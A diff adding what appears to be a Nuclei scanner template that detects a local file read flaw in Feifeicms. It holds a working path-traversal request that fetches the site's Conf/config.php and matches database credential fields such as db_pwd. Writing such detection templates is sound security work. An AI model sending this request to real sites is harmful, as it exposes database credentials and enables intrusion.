@@ -1,0 +1,24 @@
+id: feifeicms-lfr
+info:
+  name: Feifeicms Local File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: file-read
+  description: |
+    Feifeicms is vulnerable to a local file read vulnerability that allows attackers to retrieve sensitive configuration files.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?s=Admin-Data-down&id=../../Conf/config.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<?php"
+          - "db_name"
+          - "db_pwd"
+          - "db_host"
+        part: body
